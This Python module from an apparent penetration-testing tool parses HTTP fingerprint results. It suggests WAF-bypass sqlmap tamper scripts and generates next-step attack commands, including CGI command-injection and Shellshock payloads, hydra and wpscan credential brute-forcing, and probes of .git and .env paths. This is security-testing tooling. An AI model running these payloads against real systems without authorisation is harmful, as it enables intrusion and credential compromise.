#!/usr/bin/env python3
"""
souleyez.parsers.http_fingerprint_parser

Parses HTTP fingerprint output to extract WAF, CDN, managed hosting,
and technology information.
"""

import json
import re
from typing import Any, Dict, List, Optional


def parse_http_fingerprint_output(output: str, target: str = "") -> Dict[str, Any]:
    """
    Parse HTTP fingerprint output and extract detection results.

    Args:
        output: Raw output from http_fingerprint plugin
        target: Target URL from job

    Returns:
        Dict with structure:
        {
            'target': str,
            'status_code': int,
            'server': str,
            'server_version': str,
            'waf': [str],
            'cdn': [str],
            'managed_hosting': str or None,
            'technologies': [str],
            'tls': {'version': str, 'cipher': str, 'bits': int},
            'headers': {str: str},
            'redirect_url': str or None,
            'error': str or None,
        }
    """
    result = {
        "target": target,
        "status_code": None,
        "server": None,
        "server_version": None,
        "waf": [],
        "cdn": [],
        "managed_hosting": None,
        "technologies": [],
        "tls": None,
        "headers": {},
        "redirect_url": None,
        "error": None,
    }

    # Try to extract JSON result first (most reliable)
    json_match = re.search(
        r"=== JSON_RESULT ===\n(.+?)\n=== END_JSON_RESULT ===", output, re.DOTALL
    )
    if json_match:
        try:
            json_result = json.loads(json_match.group(1))
            result.update(json_result)
            result["target"] = target or result.get("target", "")
            return result
        except json.JSONDecodeError:
            pass

    # Fall back to parsing text output
    lines = output.split("\n")

    for line in lines:
        line = line.strip()

        # Parse HTTP status
        if line.startswith("HTTP Status:"):
            match = re.search(r"HTTP Status:\s+(\d+)", line)
            if match:
                result["status_code"] = int(match.group(1))

        # Parse server
        elif line.startswith("Server:"):
            result["server"] = line.replace("Server:", "").strip()

        # Parse redirect
        elif line.startswith("Redirected to:"):
            result["redirect_url"] = line.replace("Redirected to:", "").strip()

        # Parse TLS
        elif line.startswith("TLS:"):
            match = re.search(r"TLS:\s+(\S+)\s+\((.+?)\)", line)
            if match:
                result["tls"] = {
                    "version": match.group(1),
                    "cipher": match.group(2),
                }

        # Parse managed hosting
        elif line.startswith("MANAGED HOSTING DETECTED:"):
            result["managed_hosting"] = line.replace(
                "MANAGED HOSTING DETECTED:", ""
            ).strip()

        # Parse WAF (multi-line section)
        elif line.startswith("WAF/Protection Detected:"):
            continue  # Header line, actual entries follow

        # Parse CDN (multi-line section)
        elif line.startswith("CDN Detected:"):
            continue  # Header line, actual entries follow

        # Parse technologies (multi-line section)
        elif line.startswith("Technologies:"):
            continue  # Header line, actual entries follow

        # Parse list items (WAF, CDN, Technologies)
        elif line.startswith("- "):
            item = line[2:].strip()
            # Determine which list this belongs to based on context
            # This is a simple heuristic - JSON parsing is more reliable
            if any(
                waf_keyword in item.lower()
                for waf_keyword in [
                    "waf",
                    "cloudflare",
                    "akamai",
                    "imperva",
                    "sucuri",
                    "f5",
                ]
            ):
                if item not in result["waf"]:
                    result["waf"].append(item)
            elif any(
                cdn_keyword in item.lower()
                for cdn_keyword in ["cdn", "cloudfront", "fastly", "varnish", "edge"]
            ):
                if item not in result["cdn"]:
                    result["cdn"].append(item)
            else:
                if item not in result["technologies"]:
                    result["technologies"].append(item)

        # Parse error
        elif line.startswith("ERROR:"):
            result["error"] = line.replace("ERROR:", "").strip()

    return result


def is_managed_hosting(parsed_data: Dict[str, Any]) -> bool:
    """
    Check if target is a managed hosting platform.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        True if managed hosting platform detected
    """
    return parsed_data.get("managed_hosting") is not None


def get_managed_hosting_platform(parsed_data: Dict[str, Any]) -> Optional[str]:
    """
    Get the name of the managed hosting platform.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        Platform name or None
    """
    return parsed_data.get("managed_hosting")


def has_waf(parsed_data: Dict[str, Any]) -> bool:
    """
    Check if WAF is detected.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        True if WAF detected
    """
    return len(parsed_data.get("waf", [])) > 0


def get_wafs(parsed_data: Dict[str, Any]) -> List[str]:
    """
    Get list of detected WAFs.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        List of WAF names
    """
    return parsed_data.get("waf", [])


def has_cdn(parsed_data: Dict[str, Any]) -> bool:
    """
    Check if CDN is detected.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        True if CDN detected
    """
    return len(parsed_data.get("cdn", [])) > 0


def get_cdns(parsed_data: Dict[str, Any]) -> List[str]:
    """
    Get list of detected CDNs.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        List of CDN names
    """
    return parsed_data.get("cdn", [])


def build_fingerprint_context(parsed_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Build context dict for use in tool chaining.

    This is used to pass fingerprint data to downstream tools
    so they can make smarter decisions.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        Context dict for tool chaining
    """
    return {
        "http_fingerprint": {
            "managed_hosting": parsed_data.get("managed_hosting"),
            "waf": parsed_data.get("waf", []),
            "cdn": parsed_data.get("cdn", []),
            "server": parsed_data.get("server"),
            "technologies": parsed_data.get("technologies", []),
            "status_code": parsed_data.get("status_code"),
            "effective_url": parsed_data.get("effective_url"),
            "protocol_detection": parsed_data.get("protocol_detection"),
        }
    }


def get_effective_url(parsed_data: Dict[str, Any], fallback_target: str = "") -> str:
    """
    Get the effective URL from fingerprint results.

    If smart protocol detection upgraded/switched the protocol,
    returns the URL that actually worked. Otherwise returns the original.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()
        fallback_target: URL to use if no effective_url found

    Returns:
        The effective URL for downstream tools to use
    """
    return (
        parsed_data.get("effective_url") or parsed_data.get("target") or fallback_target
    )


def get_tool_recommendations(parsed_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Get recommendations for tool configuration based on fingerprint.

    Args:
        parsed_data: Output from parse_http_fingerprint_output()

    Returns:
        Dict with tool-specific recommendations
    """
    recommendations = {
        "nikto": {
            "skip_cgi": False,
            "extra_args": [],
            "reason": None,
        },
        "nuclei": {
            "extra_args": [],
            "skip_tags": [],
            "reason": None,
        },
        "sqlmap": {
            "tamper_scripts": [],
            "extra_args": [],
            "reason": None,
        },
        "general": {
            "notes": [],
        },
    }

    # Managed hosting recommendations
    if parsed_data.get("managed_hosting"):
        platform = parsed_data["managed_hosting"]
        recommendations["nikto"]["skip_cgi"] = True
        recommendations["nikto"]["extra_args"] = ["-C", "none", "-Tuning", "x6"]
        recommendations["nikto"][
            "reason"
        ] = f"Managed hosting ({platform}) - CGI enumeration skipped"

        recommendations["general"]["notes"].append(
            f"Target is hosted on {platform} - limited vulnerability surface expected"
        )

    # WAF recommendations
    wafs = parsed_data.get("waf", [])
    if wafs:
        waf_list = ", ".join(wafs)
        recommendations["general"]["notes"].append(f"WAF detected: {waf_list}")

        # SQLMap tamper scripts for common WAFs
        for waf in wafs:
            waf_lower = waf.lower()
            if "cloudflare" in waf_lower:
                recommendations["sqlmap"]["tamper_scripts"].extend(
                    ["between", "randomcase", "space2comment"]
                )
            elif "akamai" in waf_lower:
                recommendations["sqlmap"]["tamper_scripts"].extend(
                    ["charencode", "space2plus"]
                )
            elif "imperva" in waf_lower or "incapsula" in waf_lower:
                recommendations["sqlmap"]["tamper_scripts"].extend(
                    ["randomcase", "between"]
                )

        if recommendations["sqlmap"]["tamper_scripts"]:
            # Dedupe
            recommendations["sqlmap"]["tamper_scripts"] = list(
                set(recommendations["sqlmap"]["tamper_scripts"])
            )
            recommendations["sqlmap"][
                "reason"
            ] = f"WAF bypass tamper scripts for {waf_list}"

    # CDN recommendations
    cdns = parsed_data.get("cdn", [])
    if cdns:
        cdn_list = ", ".join(cdns)
        recommendations["general"]["notes"].append(
            f"CDN detected: {cdn_list} - responses may be cached, hitting edge not origin"
        )

    return recommendations


def generate_next_steps(
    parsed_data: Dict[str, Any], target: str = ""
) -> List[Dict[str, Any]]:
    """
    Generate suggested manual next steps based on fingerprint findings.

    Each step includes:
    - title: Short description of what to try
    - command: Example command to run (if applicable)
    - reason: Why this step is suggested

    Args:
        parsed_data: Output from parse_http_fingerprint_output()
        target: Target URL for command examples

    Returns:
        List of next step dicts
    """
    next_steps = []
    target_url = target or parsed_data.get("target", "")

    # Extract base URL for commands
    base_url = target_url.rstrip("/")

    # CGI paths detected - command injection testing
    robots_paths = parsed_data.get("robots_paths", [])
    cgi_paths = [
        p
        for p in robots_paths
        if "/cgi-bin/" in p or p.endswith(".cgi") or p.endswith(".pl")
    ]
    if cgi_paths:
        cgi_example = cgi_paths[0]
        next_steps.append(
            {
                "title": "Test CGI scripts for command injection",
                "commands": [
                    f'curl "{cgi_example}?param=;id"',
                    f'curl "{cgi_example}?param=|id"',
                    f'curl "{cgi_example}?param=`id`"',
                ],
                "reason": f"Found {len(cgi_paths)} CGI script(s) - common command injection targets",
            }
        )
        next_steps.append(
            {
                "title": "Test for Shellshock vulnerability",
                "commands": [
                    f"curl -A '() {{ :; }}; /bin/id' \"{cgi_example}\"",
                    f'curl -H "Cookie: () {{ :; }}; /bin/id" "{cgi_example}"',
                ],
                "reason": "CGI scripts on older systems may be vulnerable to Shellshock (CVE-2014-6271)",
            }
        )

    # Admin panels detected - authentication testing
    admin_panels = parsed_data.get("admin_panels", [])
    if admin_panels:
        admin_url = admin_panels[0].get("url", "")
        next_steps.append(
            {
                "title": "Test admin panel with default credentials",
                "commands": [
                    f'hydra -L users.txt -P passwords.txt {admin_url} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
                ],
                "reason": f"Found {len(admin_panels)} admin panel(s) - try default/common credentials",
            }
        )

    # CMS detected - CMS-specific attacks
    cms_detected = parsed_data.get("cms_detected")
    if cms_detected:
        cms_name = cms_detected.get("name", "").lower()
        if "wordpress" in cms_name:
            next_steps.append(
                {
                    "title": "Enumerate WordPress users and plugins",
                    "commands": [
                        f"wpscan --url {base_url} --enumerate u,p,t",
                        f"wpscan --url {base_url} --passwords data/wordlists/passwords_brute.txt --usernames admin",
                    ],
                    "reason": "WordPress detected - enumerate users, plugins, themes for vulnerabilities",
                }
            )
        elif "joomla" in cms_name:
            next_steps.append(
                {
                    "title": "Enumerate Joomla components",
                    "commands": [
                        f"joomscan -u {base_url}",
                    ],
                    "reason": "Joomla detected - scan for vulnerable components",
                }
            )
        elif "drupal" in cms_name:
            next_steps.append(
                {
                    "title": "Check for Drupalgeddon vulnerabilities",
                    "commands": [
                        f"droopescan scan drupal -u {base_url}",
                    ],
                    "reason": "Drupal detected - check for known vulnerabilities",
                }
            )

    # API endpoints detected - API testing
    api_endpoints = parsed_data.get("api_endpoints", [])
    if api_endpoints:
        api_url = api_endpoints[0].get("url", "")
        next_steps.append(
            {
                "title": "Enumerate API endpoints and test authentication",
                "commands": [
                    f"curl -s {api_url} | jq .",
                    f'ffuf -u "{base_url}/api/FUZZ" -w data/wordlists/api_endpoints_large.txt',
                ],
                "reason": f"Found {len(api_endpoints)} API endpoint(s) - test for auth bypass and injection",
            }
        )

    # Old server version - CVE lookup
    server = parsed_data.get("server", "")
    if server:
        # Extract version info
        version_match = re.search(r"[\d.]+", server)
        if version_match:
            next_steps.append(
                {
                    "title": f"Search for {server} exploits",
                    "commands": [
                        f'searchsploit "{server}"',
                    ],
                    "reason": f"Check for known vulnerabilities in {server}",
                }
            )

    # WAF detected - bypass techniques
    waf = parsed_data.get("waf", [])
    if waf:
        waf_name = waf[0] if waf else "WAF"
        next_steps.append(
            {
                "title": f"WAF bypass techniques for {waf_name}",
                "commands": [
                    f"wafw00f {base_url}",
                ],
                "reason": f"{waf_name} detected - may need encoding/tamper techniques for injection attacks",
            }
        )

    # Interesting paths in robots.txt (non-CGI)
    interesting_paths = [
        p
        for p in robots_paths
        if any(
            kw in p.lower()
            for kw in [
                "admin",
                "backup",
                "config",
                "db",
                "secret",
                "private",
                "upload",
                "api",
                ".git",
                ".env",
            ]
        )
    ]
    if interesting_paths and not cgi_paths:  # Don't duplicate if CGI already shown
        next_steps.append(
            {
                "title": "Check sensitive paths from robots.txt",
                "commands": [f'curl -s "{p}"' for p in interesting_paths[:3]],
                "reason": f"Found {len(interesting_paths)} potentially sensitive path(s) in robots.txt",
            }
        )

    # If redirect detected - follow it
    redirect_url = parsed_data.get("redirect_url")
    if redirect_url:
        next_steps.append(
            {
                "title": "Follow redirect and scan new target",
                "commands": [
                    f'curl -Ls "{redirect_url}"',
                ],
                "reason": f"Site redirects to {redirect_url} - scan the actual destination",
            }
        )

    return next_steps


# Export the main functions
__all__ = [
    "parse_http_fingerprint_output",
    "is_managed_hosting",
    "get_managed_hosting_platform",
    "has_waf",
    "get_wafs",
    "has_cdn",
    "get_cdns",
    "build_fingerprint_context",
    "get_tool_recommendations",
    "get_effective_url",
    "generate_next_steps",
]
